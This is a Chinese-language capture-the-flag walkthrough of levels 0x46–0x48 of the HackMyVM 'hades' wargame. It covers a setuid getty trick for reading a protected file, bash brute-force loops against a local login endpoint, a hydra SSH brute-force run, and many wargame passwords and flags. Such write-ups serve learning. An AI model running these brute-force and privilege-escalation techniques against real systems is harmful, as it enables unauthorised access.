RD4Q1GL2vXzh2kR12tL6YfUuiSI8AG6Qg6hUZisvl6R6H7wCXIskroqcmd4k8bsNVFr6SfcPzX2x
HINRonhb79nB8w6CAhnA9ZI6OMiLqPn9lU80ong+h3pPtEl6/7/nFfoGYZyvP9kwcFcAAAAASUVO
RK5CYII=
```
因为最后得到的是个二维码，所以使用 cyberchef 将 base64 解码以后按一下小魔法棒就可以得到flag了！！！
^pjDuPNQVgyhgigOIiwm^

## 46 pandora
45: pandora/HhVHfmbBIiZbZSgcgadh
```bash
pandora@hades:~$ sudo -l
[sudo] password for pandora: 
Sorry, user pandora may not run sudo on hades.
pandora@hades:~$ ls -la
total 32
drwxr-x--- 2 root    pandora 4096 Apr  5 06:36 .
drwxr-xr-x 1 root    root    4096 Apr  5 06:36 ..
-rw-r--r-- 1 pandora pandora  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 pandora pandora 3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 pandora pandora  807 Apr 23  2023 .profile
-rw-r----- 1 root    pandora   22 Apr  5 06:36 flagz.txt
-rw-r----- 1 root    pandora  155 Apr  5 06:36 mission.txt
pandora@hades:~$ grep -ra '\^*\^' .
./flagz.txt:^pjDuPNQVgyhgigOIiwm^
pandora@hades:~$ cat mission.txt 
################
# MISSION 0x46 #
################

## EN ##
User penelope lets us do something...

## ES ##
La usuaria penelope nos permite hacer algo...
pandora@hades:~$ find / -user pandora 2>/dev/null | grep -v proc
/dev/pts/9
/var/tmp/temp_png
/var/tmp/dummy.png
/pwned/pandora/.bash_logout
/pwned/pandora/.bashrc
/pwned/pandora/.profile
pandora@hades:~$ find / -group pandora 2>/dev/null | grep -v proc
/usr/bin/getty
/usr/bin/pandora
/var/tmp/temp_png
/var/tmp/dummy.png
/pwned/pandora
/pwned/pandora/.bash_logout
/pwned/pandora/.bashrc
/pwned/pandora/flagz.txt
/pwned/pandora/mission.txt
/pwned/pandora/.profile
pandora@hades:~$ find / -user penelope 2>/dev/null | grep -v proc
/usr/bin/getty
/var/tmp/fibi
/var/tmp/fibi/pass.txt
/var/tmp/fibi/s.sh
/var/tmp/penelope
/var/tmp/penelope/data
/etc/pene.conf
pandora@hades:~$ find / -group penelope 2>/dev/null | grep -v proc
/var/tmp/fibi
/var/tmp/fibi/pass.txt
/var/tmp/fibi/s.sh
/var/tmp/penelope
/var/tmp/penelope/data
/etc/pene.conf
/pwned/penelope
pandora@hades:~$ ls -la /usr/bin/getty
-rwsr-sr-x 1 penelope pandora 69112 Apr  5 06:36 /usr/bin/getty
pandora@hades:~$ ls -la /usr/bin/pandora
-rw-r----- 1 root pandora 21 Apr  5 06:36 /usr/bin/pandora
pandora@hades:~$ ls -la /etc/pene.conf
-r-------- 1 penelope penelope 21 Jan 20  1979 /etc/pene.conf
pandora@hades:~$ cat /usr/bin/pandora
HhVHfmbBIiZbZSgcgadh
pandora@hades:~$ /usr/bin/getty --help

Usage:
 getty [options] <line> [<baud_rate>,...] [<termtype>]
 getty [options] <baud_rate>,... <line> [<termtype>]

Open a terminal and set its mode.

Options:
 -8, --8bits                assume 8-bit tty
 -a, --autologin <user>     login the specified user automatically
 -c, --noreset              do not reset control mode
 -E, --remote               use -r <hostname> for login(1)
 -f, --issue-file <list>    display issue files or directories
     --show-issue           display issue file and exit
 -h, --flow-control         enable hardware flow control
 -H, --host <hostname>      specify login host
 -i, --noissue              do not display issue file
 -I, --init-string <string> set init string
 -J  --noclear              do not clear the screen before prompt
 -l, --login-program <file> specify login program
 -L, --local-line[=<mode>]  control the local line flag
 -m, --extract-baud         extract baud rate during connect
 -n, --skip-login           do not prompt for login
 -N  --nonewline            do not print a newline before issue
 -o, --login-options <opts> options that are passed to login
 -p, --login-pause          wait for any key before the login
 -r, --chroot <dir>         change root to the directory
 -R, --hangup               do virtually hangup on the tty
 -s, --keep-baud            try to keep baud rate after break
 -t, --timeout <number>     login process timeout
 -U, --detect-case          detect uppercase terminal
 -w, --wait-cr              wait carriage-return
     --nohints              do not print hints
     --nohostname           no hostname at all will be shown
     --long-hostname        show full qualified hostname
     --erase-chars <string> additional backspace chars
     --kill-chars <string>  additional kill chars
     --chdir <directory>    chdir before the login
     --delay <number>       sleep seconds before prompt
     --nice <number>        run login with this priority
     --reload               reload prompts on running agetty instances
     --list-speeds          display supported baud rates
     --help                 display this help
     --version              display version

For more details see agetty(8).
```
和`agetty`还有点不一样，群主找师傅寻求了帮助得到了办法；
```bash
pandora@hades:~$ getty -8 - --issue-file /etc/pene.conf

anoRxVKulaoMNKMrddVe
hades login: whoami
login: Cannot possibly work without effective root
```
看来还是得自己多看文档，不能总到处搜找现成的，哈哈哈


## 47 penelope
```bash
penelope@hades:~$ ls -la
total 32
drwxr-x--- 2 root     penelope 4096 Apr  5 06:36 .
drwxr-xr-x 1 root     root     4096 Apr  5 06:36 ..
-rw-r--r-- 1 penelope penelope  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 penelope penelope 3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 penelope penelope  807 Apr 23  2023 .profile
-rw-r----- 1 root     penelope   22 Apr  5 06:36 flagz.txt
-rw-r----- 1 root     penelope  315 Apr  5 06:36 mission.txt
penelope@hades:~$ cat flagz.txt
^OGaiNcpusBXCHrDZjwN^
penelope@hades:~$ cat mission.txt 
################
# MISSION 0x47 #
################

## EN ##
If we give a username (user) and password (password) at http: //localhost/request.php, user phoebe may give us her password. 

## ES ##
Si damos un usuario (user) y password (password) en http://localhost/request.php puede que phoebe nos de su password.
penelope@hades:~$ curl -is http://localhost/request.php -X POST -d 'username=user&password=password'
HTTP/1.1 200 OK
Server: nginx/1.22.1
Date: Fri, 05 Jul 2024 05:37:11 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive


NOTHING.
penelope@hades:~$ curl -is http://localhost/request.php?username=user&password=password
[1] 41017
penelope@hades:~$ HTTP/1.1 200 OK
Server: nginx/1.22.1
Date: Fri, 05 Jul 2024 05:37:17 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive


NOTHING.

penelope@hades:~$ curl -is -H "Content-Type:application/json" -H "Accept: application/json" -X POST -d '{"username" : "user", "password" : "password" }' http://localhost/request.php 
HTTP/1.1 200 OK
Server: nginx/1.22.1
Date: Fri, 05 Jul 2024 05:46:12 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive


NOTHING.

penelope@hades:~$ curl -v -X PUT -d "username=user&password=password" http://localhost/request.php
*   Trying 127.0.0.1:80...
* Connected to localhost (127.0.0.1) port 80 (#0)
> PUT /request.php HTTP/1.1
> Host: localhost
> User-Agent: curl/7.88.1
> Accept: */*
> Content-Length: 31
> Content-Type: application/x-www-form-urlencoded
> 
< HTTP/1.1 200 OK
< Server: nginx/1.22.1
< Date: Fri, 05 Jul 2024 07:29:04 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< 

NOTHING.
* Connection #0 to host localhost left intact

```

发现有人留了一个脚本，我尝试重新写了一下，但是没啥收获。。。。
```bash
#!/bin/bash
for pass in $(cat pass); do
    echo "[+] password -> $pass"
    
    url=$(curl -s http://localhost/request.php -d "user=phoebe&password=$pass")
    if [[ $url == *"NOTHING."*  ]]; then
        echo "[-] Wrong!"
        clear
    else
        echo "[+] Response - ̗̀( ˶'ᵕ'˶)  $pass"
        break
    fi
done
```

后来我问了一下rpj7，他透露并非使默认的用户名和密码，而是要尝试爆破：

```bash
for user in $(cat ./100.txt); do for pass in $(cat ./100.txt); do curl -s http://localhost/request.php?user=$user&password=$pass; done; done;
```

没跑出来，尝试换个字典，尝试之前得到的用户名和密码：

```plain Text
01: acantha/mYYLhLBSkrzZqFydxGkn
02: alala/DsYzpJQrCEndEWIMxWxu
03: althea/ObxEmwisYjERrDfvSbdA
04: andromeda/OTWGTbHzrxhYFSTlKcOt
05: anthea/yWFLtSNQArEBTHtWgkKd
06: aphrodite/HPJVaqRzieKQeyyATsFv
07: ariadne/iNgNazuJrmhJKWixktzk
08: arete/QjrIovHacmGWxVjXRLmA
09: artemis/HIiaojeORLaJBVSPDDCZ
10: asia/djqWtkLisbQlrGtLYHCv
11: asteria/hawMVJCYrBgoDAMVhuwT
12: astraea/nZkEYtjvHElOtupXKzTE
13: atalanta/mUcSNQlaXtwSvGcgeTYZ
14: athena/kmQMpZsXgOsnzGReRcoV
15: aura/TiqpedAFjwmVyBlYpzRh
16: aegle/YRturIymmHSdBmEClEGe
17: calliope/IlhyWxZuqIHAuqVOpXfQ
18: calypso/TAMYefoHcCPmexwImodo
19: cassandra/CKzlnvmHQz
20: cassiopeia/gRqFnHblmZVZSfegPLvO
21: clio/cqJqRPaUtuoUYXbaxnZq
22: cybele/UICacOPmJMWbKyPwNZod
23: cynthia/QHLjXdGSiRShtWpMwFjj
24: daphne/EkdtKuXCJjlFKFpKgddX
25: delia/bNCvocyOpoMVeCtxrhTt
26: demeter/FkyuXkkJNONDChoaKzOI
27: echo/GztROerShmiyiCIlfepG
28: eos/CWBKRQX
29: gaia/sbUcegcdYTTWzTKojzgm
30: halcyon/cuMRRameGdmhVxHcYYYs
31: hebe/tOlbuBLjFWntVDNmjHIG
32: hera/JzpyRXRzWoHKZwgWzleM
33: hermione/vzhOebSSplFoXPKxwtqU
34: hero/vlImTDSGnTMwLFgRWCOc
35: hestia/opTNnZQAuFJsauNPHXVq
36: ianthe/DphioLqgVIIFclTwBsMP
37: irene/TDyuLyWLDksEhgmAYDJC
38: iris/FiqGNcXumTKwLTPRqXMh
39: kore/mdAXiSXteTPiGGTpmajP
40: leda/NODEVILINHELL
41: maia/GIVEMEANEWMIND
42: nephele/rZtaitCxlEIRxBayVpgZ
43: nyx/HXisrOPSdTcSSTEyyaLn
44: pallas/wWxyXnNbmjxNMEAIjbjT
45: pandora/HhVHfmbBIiZbZSgcgadh
46: penelope/anoRxVKulaoMNKMrddVe
```

```bash
hgbe02@pwn:~/temp$ vim up
hgbe02@pwn:~/temp$ head -n 3 up
01: acantha/mYYLhLBSkrzZqFydxGkn
02: alala/DsYzpJQrCEndEWIMxWxu
03: althea/ObxEmwisYjERrDfvSbdA
hgbe02@pwn:~/temp$ cat up | awk -F'[: /]' '{print $3}' > user.txt
hgbe02@pwn:~/temp$ cat up | awk -F'[: /]' '{print $4}' > pass.txt
```

传过去，或者复制粘贴，然后尝试运行脚本，一直得不到结果，尝试换常见密码，账号换为下一关账号：

尝试进行爆破，尝试写一个脚本进行爆破：

```bash
for user in $(cat user.txt)
do    
    for pass in $(cat pass.txt)
    do
        echo "[USER] => $user"
        url=$(curl -s "http://localhost/request.php?user=$user&password=$pass" | grep -v '^$')
        if [[ $url == *"NOTHING"* ]]; then
            echo "[-]Wrong!"      
        else
            echo "[+] Response - ̗̀( ˶'ᵕ'˶)  $url"
            echo "$user : $pass : $url" >> response.txt
        fi
    done
done
```
运行大致效果如下：
```bash
penelope@hades:/tmp/hgbe02$ bash exp.sh 
[USER] => acantha
[+] Response - ̗̀( ˶'ᵕ'˶)  XXXXXXXXXXX
[USER] => acantha
[-]Wrong!
......
```

看一下response！
```bash
acantha : mYYLhLBSkrzZqFydxGkn : yWFLtSNQArEBTHtWgkKd
alala : DsYzpJQrCEndEWIMxWxu : yABCtSNQArEBTHtWgkKd
asia : GztROerShmiyiCIlfepG : YRturIymmHSdBmEClEGe
aura : TiqpedAFjwmVyBlYpzRh : HIiaojeORLaJBVSPDDCZ
delia : bNCvocyOpoMVeCtxrhTt : QHLjVBGSiRShtWpMwFjj
eos : vlImTDSGnTMwLFgRWCOc : FkyuXkkJNONDChoaKzOI
ianthe : DphioLqgVIIFclTwBsMP : NOP
nephele : FkyuXkkJNONDChoaKzOI : kmQMpZsXgOsnzGReRcoZ
```
yABCVBNQArEBTHtWgkKZ

尝试了都不对。。。。。尝试换传参方法试试：

```bash
for user in $(cat user.txt)
do    
    for pass in $(cat pass.txt)
    do
        echo "[USER] => $user"
        url=$(curl -s "http://localhost/request.php" -d "user=$user&password=$pass" | grep -v '^$')
        if [[ $url == *"NOTHING"* ]]; then
            echo "[-]Wrong!"      
        else
            echo "[+] Response - ̗̀( ˶'ᵕ'˶)  $url"
            echo "$user : $pass : $url" >> response_post.txt
        fi
    done
done
```
但是啥都没有了。。。。尝试爆破一下。。。。。

```bash
hgbe02@pwn:~/temp/47$ hydra -L user.txt -P pass.txt ssh://hades.hackmyvm.eu:6666
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-07-08 23:48:23
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 2544 login tries (l:53/p:48), ~159 tries per task
[DATA] attacking ssh://hades.hackmyvm.eu:6666/
[6666][ssh] host: hades.hackmyvm.eu   login: acantha   password: mYYLhLBSkrzZqFydxGkn
[6666][ssh] host: hades.hackmyvm.eu   login: aegle   password: YRturIymmHSdBmEClEGe
[6666][ssh] host: hades.hackmyvm.eu   login: alala   password: DsYzpJQrCEndEWIMxWxu
[6666][ssh] host: hades.hackmyvm.eu   login: althea   password: ObxEmwisYjERrDfvSbdA
[6666][ssh] host: hades.hackmyvm.eu   login: andromeda   password: OTWGTbHzrxhYFSTlKcOt
[6666][ssh] host: hades.hackmyvm.eu   login: anthea   password: yWFLtSNQArEBTHtWgkKd
[6666][ssh] host: hades.hackmyvm.eu   login: aphrodite   password: HPJVaqRzieKQeyyATsFv
[6666][ssh] host: hades.hackmyvm.eu   login: arete   password: QjrIovHacmGWxVjXRLmA
[STATUS] 385.00 tries/min, 385 tries in 00:01h, 2160 to do in 00:06h, 16 active
[6666][ssh] host: hades.hackmyvm.eu   login: ariadne   password: iNgNazuJrmhJKWixktzk
[6666][ssh] host: hades.hackmyvm.eu   login: artemis   password: HIiaojeORLaJBVSPDDCZ
[6666][ssh] host: hades.hackmyvm.eu   login: asia   password: djqWtkLisbQlrGtLYHCv
[6666][ssh] host: hades.hackmyvm.eu   login: asteria   password: hawMVJCYrBgoDAMVhuwT
[6666][ssh] host: hades.hackmyvm.eu   login: astraea   password: nZkEYtjvHElOtupXKzTE
[6666][ssh] host: hades.hackmyvm.eu   login: atalanta   password: mUcSNQlaXtwSvGcgeTYZ
[6666][ssh] host: hades.hackmyvm.eu   login: athena   password: kmQMpZsXgOsnzGReRcoV
[6666][ssh] host: hades.hackmyvm.eu   login: aura   password: TiqpedAFjwmVyBlYpzRh
[6666][ssh] host: hades.hackmyvm.eu   login: calliope   password: IlhyWxZuqIHAuqVOpXfQ
[6666][ssh] host: hades.hackmyvm.eu   login: calypso   password: TAMYefoHcCPmexwImodo
[STATUS] 292.33 tries/min, 877 tries in 00:03h, 1670 to do in 00:06h, 16 active
[6666][ssh] host: hades.hackmyvm.eu   login: cassandra   password: CKzlnvmHQz
[6666][ssh] host: hades.hackmyvm.eu   login: cassiopeia   password: gRqFnHblmZVZSfegPLvO
[6666][ssh] host: hades.hackmyvm.eu   login: clio   password: cqJqRPaUtuoUYXbaxnZq
[6666][ssh] host: hades.hackmyvm.eu   login: cybele   password: UICacOPmJMWbKyPwNZod
[6666][ssh] host: hades.hackmyvm.eu   login: cynthia   password: QHLjXdGSiRShtWpMwFjj
[6666][ssh] host: hades.hackmyvm.eu   login: daphne   password: EkdtKuXCJjlFKFpKgddX
[6666][ssh] host: hades.hackmyvm.eu   login: delia   password: bNCvocyOpoMVeCtxrhTt
[6666][ssh] host: hades.hackmyvm.eu   login: demeter   password: FkyuXkkJNONDChoaKzOI
[6666][ssh] host: hades.hackmyvm.eu   login: echo   password: GztROerShmiyiCIlfepG
[6666][ssh] host: hades.hackmyvm.eu   login: eos   password: CWBKRQX
[6666][ssh] host: hades.hackmyvm.eu   login: gaia   password: sbUcegcdYTTWzTKojzgm
[6666][ssh] host: hades.hackmyvm.eu   login: halcyon   password: cuMRRameGdmhVxHcYYYs
[6666][ssh] host: hades.hackmyvm.eu   login: hebe   password: tOlbuBLjFWntVDNmjHIG
[6666][ssh] host: hades.hackmyvm.eu   login: hera   password: JzpyRXRzWoHKZwgWzleM
[6666][ssh] host: hades.hackmyvm.eu   login: hermione   password: vzhOebSSplFoXPKxwtqU
[6666][ssh] host: hades.hackmyvm.eu   login: hero   password: vlImTDSGnTMwLFgRWCOc
[6666][ssh] host: hades.hackmyvm.eu   login: hestia   password: opTNnZQAuFJsauNPHXVq
[6666][ssh] host: hades.hackmyvm.eu   login: ianthe   password: DphioLqgVIIFclTwBsMP
[STATUS] 271.43 tries/min, 1900 tries in 00:07h, 647 to do in 00:03h, 16 active
[6666][ssh] host: hades.hackmyvm.eu   login: irene   password: TDyuLyWLDksEhgmAYDJC
[6666][ssh] host: hades.hackmyvm.eu   login: iris   password: FiqGNcXumTKwLTPRqXMh
[6666][ssh] host: hades.hackmyvm.eu   login: kore   password: mdAXiSXteTPiGGTpmajP
[6666][ssh] host: hades.hackmyvm.eu   login: leda   password: NODEVILINHELL
[6666][ssh] host: hades.hackmyvm.eu   login: maia   password: GIVEMEANEWMIND
[6666][ssh] host: hades.hackmyvm.eu   login: nephele   password: rZtaitCxlEIRxBayVpgZ
[6666][ssh] host: hades.hackmyvm.eu   login: nyx   password: HXisrOPSdTcSSTEyyaLn
[6666][ssh] host: hades.hackmyvm.eu   login: pallas   password: wWxyXnNbmjxNMEAIjbjT
[6666][ssh] host: hades.hackmyvm.eu   login: pandora   password: HhVHfmbBIiZbZSgcgadh
[6666][ssh] host: hades.hackmyvm.eu   login: penelope   password: anoRxVKulaoMNKMrddVe
1 of 1 target successfully completed, 46 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-07-08 23:58:44
```

没有我们要的密码。。。。
yABCtSNQArEBTHtWgkKd
yWFLtSNQArEBTHtWgkKd
前四位和anthea密码不一样，其他一样
QHLjVBGSiRShtWpMwFjj    
QHLjXdGSiRShtWpMwFjj
五六位和cynthia密码不一样，其他一样
kmQMpZsXgOsnzGReRcoZ  
kmQMpZsXgOsnzGReRcoV
最后一位和athena密码不一样，其他一样

嘶，魔怔了。。。。。

突然 rpj7师傅看到了我的再一次求助，给我提示了一下：
> just noticed your message last night.... are you sure you all the passwords with all the users.... including the easily overlooked password for level 00 "hacker"

嘶。。。。。。试试，整！！！！添加密码，运行程序：
```text
acantha : mYYLhLBSkrzZqFydxGkn : yWFLtSNQArEBTHtWgkKd
alala : DsYzpJQrCEndEWIMxWxu : yABCtSNQArEBTHtWgkKd
aphrodite : begood! : FPLwKmmKhcWAwRxiaBDN
asia : GztROerShmiyiCIlfepG : YRturIymmHSdBmEClEGe
aura : TiqpedAFjwmVyBlYpzRh : HIiaojeORLaJBVSPDDCZ
delia : bNCvocyOpoMVeCtxrhTt : QHLjVBGSiRShtWpMwFjj
eos : vlImTDSGnTMwLFgRWCOc : FkyuXkkJNONDChoaKzOI
ianthe : DphioLqgVIIFclTwBsMP : NOP
nephele : FkyuXkkJNONDChoaKzOI : kmQMpZsXgOsnzGReRcoZ
```
我擦，还真搞出来了一个密码，牛逼rpj7！！！登录，成功！


## 48 phoebe
```bash
phoebe@hades:~$ ls -la
total 32
drwxr-x--- 2 root   phoebe 4096 Apr  5 06:36 .
drwxr-xr-x 1 root   root   4096 Apr  5 06:36 ..
-rw-r--r-- 1 phoebe phoebe  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 phoebe phoebe 3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 phoebe phoebe  807 Apr 23  2023 .profile
-rw-r----- 1 root   phoebe   22 Apr  5 06:36 flagz.txt
-rw-r----- 1 root   phoebe  139 Apr  5 06:36 mission.txt
phoebe@hades:~$ cat flagz.txt 
^CrsphcuWGgjhlBYXhzQ^
phoebe@hades:~$ cat mission.txt 
################
# MISSION 0x48 #
################

## EN ##
User rhea likes pictures.

## ES ##
A la usuaria rhea le gustan las imagenes.
phoebe@hades:~$ sudo -l
Matching Defaults entries for phoebe on hades:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User phoebe may run the following commands on hades:
    (rhea) NOPASSWD: /usr/bin/convert
```

尝试提权：

```bash
phoebe@hades:~$ find / -user rhea 2>/dev/null | grep -v proc
phoebe@hades:~$ find / -group rhea 2>/dev/null | grep -v proc
/usr/sbin/re
/pwned/rhea
phoebe@hades:~$ /usr/sbin/re
-bash: /usr/sbin/re: Permission denied
phoebe@hades:~$ ls -la /usr/sbin/re
-rw-r----- 1 root rhea 21 Apr  5 06:36 /usr/sbin/re
```

这个文件就是我们要读取的了！

但是实在找不到办法，只能挨个解析文档了：
```bash
Version: ImageMagick 6.9.11-60 Q16 x86_64 2021-01-25 https://imagemagick.org
Copyright: (C) 1999-2021 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC Modules OpenMP(4.5)
Delegates (built-in): bzlib djvu fftw fontconfig freetype heic jbig jng jp2 jpeg lcms lqr ltdl lzma openexr pangocairo png tiff webp wmf x xml zlib
Usage: convert [options ...] file [ [options ...] file ...] [options ...] file

Image Settings:
  -adjoin              join images into a single multi-image file
  -affine matrix       affine transform matrix
  -alpha option        activate, deactivate, reset, or set the alpha channel
  -antialias           remove pixel-aliasing
  -authenticate password
                       decipher image with this password
  -attenuate value     lessen (or intensify) when adding noise to an image
  -background color    background color
  -bias value          add bias when convolving an image
  -black-point-compensation
                       use black point compensation
  -blue-primary point  chromaticity blue primary point
  -bordercolor color   border color
  -caption string      assign a caption to an image
  -channel type        apply option to select image channels
  -clip-mask filename  associate a clip mask with the image
  -colors value        preferred number of colors in the image
  -colorspace type     alternate image colorspace
  -comment string      annotate image with comment
  -compose operator    set image composite operator
  -compress type       type of pixel compression when writing the image
  -define format:option
                       define one or more image format options
  -delay value         display the next image after pausing
  -density geometry    horizontal and vertical density of the image
  -depth value         image depth
  -direction type      render text right-to-left or left-to-right
  -display server      get image or font from this X server
  -dispose method      layer disposal method
  -dither method       apply error diffusion to image
  -encoding type       text encoding type
  -endian type         endianness (MSB or LSB) of the image
  -family name         render text with this font family
  -fill color          color to use when filling a graphic primitive
  -filter type         use this filter when resizing an image
  -font name           render text with this font
  -format "string"     output formatted image characteristics
  -fuzz distance       colors within this distance are considered equal
  -gravity type        horizontal and vertical text placement
  -green-primary point chromaticity green primary point
  -intensity method    method to generate intensity value from pixel
  -intent type         type of rendering intent when managing the image color
  -interlace type      type of image interlacing scheme
  -interline-spacing value
                       set the space between two text lines
  -interpolate method  pixel color interpolation method
  -interword-spacing value
                       set the space between two words
  -kerning value       set the space between two letters
  -label string        assign a label to an image
  -limit type value    pixel cache resource limit
  -loop iterations     add Netscape loop extension to your GIF animation
  -mask filename       associate a mask with the image
  -matte               store matte channel if the image has one
  -mattecolor color    frame color
  -moments             report image moments
  -monitor             monitor progress
  -orient type         image orientation
  -page geometry       size and location of an image canvas (setting)
  -ping                efficiently determine image attributes
  -pointsize value     font point size
  -precision value     maximum number of significant digits to print
  -preview type        image preview type
  -quality value       JPEG/MIFF/PNG compression level
  -quiet               suppress all warning messages
  -red-primary point   chromaticity red primary point
  -regard-warnings     pay attention to warning messages
  -remap filename      transform image colors to match this set of colors
  -repage geometry     size and location of an image canvas
  -respect-parentheses settings remain in effect until parenthesis boundary
  -sampling-factor geometry
                       horizontal and vertical sampling factor
  -scene value         image scene number
  -seed value          seed a new sequence of pseudo-random numbers
  -size geometry       width and height of image
  -stretch type        render text with this font stretch
  -stroke color        graphic primitive stroke color
  -strokewidth value   graphic primitive stroke width
  -style type          render text with this font style
  -support factor      resize support: > 1.0 is blurry, < 1.0 is sharp
  -synchronize         synchronize image to storage device
  -taint               declare the image as modified
  -texture filename    name of texture to tile onto the image background
  -tile-offset geometry
                       tile offset
  -treedepth value     color tree depth
  -transparent-color color
                       transparent color
  -undercolor color    annotation bounding box color
  -units type          the units of image resolution
  -verbose             print detailed information about the image
  -view                FlashPix viewing transforms
  -virtual-pixel method
                       virtual pixel access method
  -weight type         render text with this font weight
  -white-point point   chromaticity white point

Image Operators:
  -adaptive-blur geometry
                       adaptively blur pixels; decrease effect near edges
  -adaptive-resize geometry
                       adaptively resize image using 'mesh' interpolation
  -adaptive-sharpen geometry
                       adaptively sharpen pixels; increase effect near edges
  -alpha option        on, activate, off, deactivate, set, opaque, copy
                       transparent, extract, background, or shape
  -annotate geometry text
                       annotate the image with text
  -auto-gamma          automagically adjust gamma level of image
  -auto-level          automagically adjust color levels of image
  -auto-orient         automagically orient (rotate) image
  -bench iterations    measure performance
  -black-threshold value
                       force all pixels below the threshold into black
  -blue-shift factor   simulate a scene at nighttime in the moonlight
  -blur geometry       reduce image noise and reduce detail levels
  -border geometry     surround image with a border of color
  -bordercolor color   border color
  -brightness-contrast geometry
                       improve brightness / contrast of the image
  -canny geometry      detect edges in the image
  -cdl filename        color correct with a color decision list
  -charcoal radius     simulate a charcoal drawing
  -chop geometry       remove pixels from the image interior
  -clamp               keep pixel values in range (0-QuantumRange)
  -clip                clip along the first path from the 8BIM profile
  -clip-path id        clip along a named path from the 8BIM profile
  -colorize value      colorize the image with the fill color
  -color-matrix matrix apply color correction to the image
  -connected-components connectivity
                       connected-components uniquely labeled
  -contrast            enhance or reduce the image contrast
  -contrast-stretch geometry
                       improve contrast by `stretching' the intensity range
  -convolve coefficients
                       apply a convolution kernel to the image
  -cycle amount        cycle the image colormap
  -decipher filename   convert cipher pixels to plain pixels
  -deskew threshold    straighten an image
  -despeckle           reduce the speckles within an image
  -distort method args
                       distort images according to given method ad args
  -draw string         annotate the image with a graphic primitive
  -edge radius         apply a filter to detect edges in the image
  -encipher filename   convert plain pixels to cipher pixels
  -emboss radius       emboss an image
  -enhance             apply a digital filter to enhance a noisy image
  -equalize            perform histogram equalization to an image
  -evaluate operator value
                       evaluate an arithmetic, relational, or logical expression
  -extent geometry     set the image size
  -extract geometry    extract area from image
  -features distance   analyze image features (e.g. contrast, correlation)
  -fft                 implements the discrete Fourier transform (DFT)
  -flip                flip image vertically
  -floodfill geometry color
                       floodfill the image with color
  -flop                flop image horizontally
  -frame geometry      surround image with an ornamental border
  -function name parameters
                       apply function over image values
  -gamma value         level of gamma correction
  -gaussian-blur geometry
                       reduce image noise and reduce detail levels
  -geometry geometry   preferred size or location of the image
  -grayscale method    convert image to grayscale
  -hough-lines geometry
                       identify lines in the image
  -identify            identify the format and characteristics of the image
  -ift                 implements the inverse discrete Fourier transform (DFT)
  -implode amount      implode image pixels about the center
  -interpolative-resize geometry
                       resize image using 'point sampled' interpolation
  -kuwahara geometry   edge preserving noise reduction filter
  -lat geometry        local adaptive thresholding
  -level value         adjust the level of image contrast
  -level-colors color,color
                       level image with the given colors
  -linear-stretch geometry
                       improve contrast by `stretching with saturation'
  -liquid-rescale geometry
                       rescale image with seam-carving
  -local-contrast geometry
                       enhance local contrast
  -magnify             double the size of the image with pixel art scaling
  -mean-shift geometry delineate arbitrarily shaped clusters in the image
  -median geometry     apply a median filter to the image
  -mode geometry       make each pixel the 'predominant color' of the
                       neighborhood
  -modulate value      vary the brightness, saturation, and hue
  -monochrome          transform image to black and white
  -morphology method kernel
                       apply a morphology method to the image
  -motion-blur geometry
                       simulate motion blur
  -negate              replace every pixel with its complementary color
  -noise geometry      add or reduce noise in an image
  -normalize           transform image to span the full range of colors
  -opaque color        change this color to the fill color
  -ordered-dither NxN
                       add a noise pattern to the image with specific
                       amplitudes
  -paint radius        simulate an oil painting
  -perceptible epsilon
                       pixel value less than |epsilon| become epsilon or
                       -epsilon
  -polaroid angle      simulate a Polaroid picture
  -posterize levels    reduce the image to a limited number of color levels
  -profile filename    add, delete, or apply an image profile
  -quantize colorspace reduce colors in this colorspace
  -radial-blur angle   radial blur the image (deprecated use -rotational-blur
  -raise value         lighten/darken image edges to create a 3-D effect
  -random-threshold low,high
                       random threshold the image
  -region geometry     apply options to a portion of the image
  -render              render vector graphics
  -resample geometry   change the resolution of an image
  -resize geometry     resize the image
  -roll geometry       roll an image vertically or horizontally
  -rotate degrees      apply Paeth rotation to the image
  -rotational-blur angle
                       rotational blur the image
  -sample geometry     scale image with pixel sampling
  -scale geometry      scale the image
  -segment values      segment an image
  -selective-blur geometry
                       selectively blur pixels within a contrast threshold
  -sepia-tone threshold
                       simulate a sepia-toned photo
  -set property value  set an image property
  -shade degrees       shade the image using a distant light source
  -shadow geometry     simulate an image shadow
  -sharpen geometry    sharpen the image
  -shave geometry      shave pixels from the image edges
  -shear geometry      slide one edge of the image along the X or Y axis
  -sigmoidal-contrast geometry
                       increase the contrast without saturating highlights or
                       shadows
  -sketch geometry     simulate a pencil sketch
  -solarize threshold  negate all pixels above the threshold level
  -sparse-color method args
                       fill in a image based on a few color points
  -splice geometry     splice the background color into the image
  -spread radius       displace image pixels by a random amount
  -statistic type geometry
                       replace each pixel with corresponding statistic from the
                       neighborhood
  -strip               strip image of all profiles and comments
  -swirl degrees       swirl image pixels about the center
  -threshold value     threshold the image
  -thumbnail geometry  create a thumbnail of the image
  -tile filename       tile image when filling a graphic primitive
  -tint value          tint the image with the fill color
  -transform           affine transform image
  -transparent color   make this color transparent within the image
  -transpose           flip image vertically and rotate 90 degrees
  -transverse          flop image horizontally and rotate 270 degrees
  -trim                trim image edges
  -type type           image type
  -unique-colors       discard all but one of any pixel color
  -unsharp geometry    sharpen the image
  -vignette geometry   soften the edges of the image in vignette style
  -wave geometry       alter an image along a sine wave
  -wavelet-denoise threshold
